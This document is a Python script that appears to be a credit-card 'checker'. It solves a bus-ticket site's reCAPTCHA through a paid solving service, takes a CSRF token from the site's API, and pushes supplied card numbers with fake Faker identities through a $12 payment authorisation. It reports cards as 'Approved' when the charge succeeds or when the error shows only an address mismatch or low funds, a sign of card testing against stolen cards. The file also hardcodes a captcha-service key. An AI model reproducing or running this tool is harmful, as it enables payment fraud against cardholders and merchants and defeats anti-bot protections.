import uuid
import time
from faker import Faker
from httpx import AsyncClient
import asyncio

async def bm_auth(cc, mes, ano, cvv,proxyg):
    async with AsyncClient(proxy=proxyg) as web:
            NEXTCAPTCHA_KEY = "next_e4187cce3a57286399989a1f27032e488e"
            fake = Faker()
            street = fake.street_address()
            city = fake.city()
            state = fake.state()
            zipcode = fake.zipcode()
            phone = fake.phone_number()
            name = fake.first_name()
            last = fake.last_name()
            email = f"{str(uuid.uuid4())[:8]}@gmail.com"

            json_data = {
                "clientKey": NEXTCAPTCHA_KEY,
                "task": {
                    "type": "RecaptchaV3TaskProxyless",
                    "websiteURL": "https://www.p-b.com",
                    "websiteKey": "6Lc1msIfAAAAAOa4o03NGeYDHOx_Gb08Rmxgjnng",
                    "websiteInfo": "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",
                    "pageAction": "PB_ProcessOrder"
                }
            }

            gg = await web.post('https://api.nextcaptcha.com/createTask', json=json_data)
            rcap = gg.text
            taskid = rcap.split('"taskId":')[1].split(',')[0]

            captcha = None
            while not captcha:
                await asyncio.sleep(2)
                
                json_data = {
                    "clientKey": NEXTCAPTCHA_KEY,
                    "taskId": int(taskid)
                }
                
                gg = await web.post('https://api.nextcaptcha.com/getTaskResult', json=json_data)
                rcap2 = gg.text

                if '"status":"ready"' in rcap2:
                    captcha = rcap2.split('"gRecaptchaResponse":"')[1].split('"')[0]

            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'es-419,es;q=0.7',
                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryBJUTa44uzVUQf6ff',
                'origin': 'https://www.p-b.com',
                'priority': 'u=1, i',
                'referer': 'https://www.p-b.com/buy-bus-tickets/',
                'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            }

            data = f'------WebKitFormBoundaryBJUTa44uzVUQf6ff\r\nContent-Disposition: form-data; name="method"\r\n\r\nvalidateGoogleRecaptchaAndGetCsrfToken\r\n------WebKitFormBoundaryBJUTa44uzVUQf6ff\r\nContent-Disposition: form-data; name="tokenRequest[token]"\r\n\r\n{captcha}\r\n------WebKitFormBoundaryBJUTa44uzVUQf6ff\r\nContent-Disposition: form-data; name="tokenRequest[action]"\r\n\r\nPB_ProcessOrder\r\n------WebKitFormBoundaryBJUTa44uzVUQf6ff--\r\n'

            response = await web.post('https://www.p-b.com/wp-content/plugins/pb_app/api.php', headers=headers, data=data) #type :ignore
            r1 = response.text
            
            print(r1)
            
            token = r1.split('"token":"')[1].split('"')[0]
            
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-419,es;q=0.7',
                'cache-control': 'no-cache',
                'origin': 'https://www.p-b.com',
                'priority': 'u=1, i',
                'referer': 'https://www.p-b.com/',
                'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'x-authorization': 'Bearer: null',
                'x-authorization-refresh': 'Bearer: null',
                'x-company-code': 'PB',
                'x-csrf-token': token,
            }

            json_data = {
                'userId': 112,
                'amount': 12,
                'creditCardHolderFullName': f'{name} {last}',
                'creditCardAddress': street,
                'creditCardZipCode': zipcode,
                'creditCardNumber': cc,
                'creditCardSecurityCode': '',
                'creditCardExpirationMonth': int(mes),
                'creditCardExpirationYear': int(ano),
            }
            
            req2 = await web.post('https://paymentapi.smartstubs.com/api/public/authorizeTransaction', headers=headers, json=json_data)
            print(req2.text)
            if '"hasError":false' in req2.text:
                status = "Approved ✅"
                mensaje = "Charged $12.00"
            else:
                mensaje = req2.text.split('errorMessage":"')[1].split('"')[0]
                if "AVS REJECTED" in mensaje:
                    status = "Approved ✅"
                elif "Not sufficient funds" in mensaje:
                    status = "Approved ✅"
                else:
                    status = "Declined ❌"
            return status, mensaje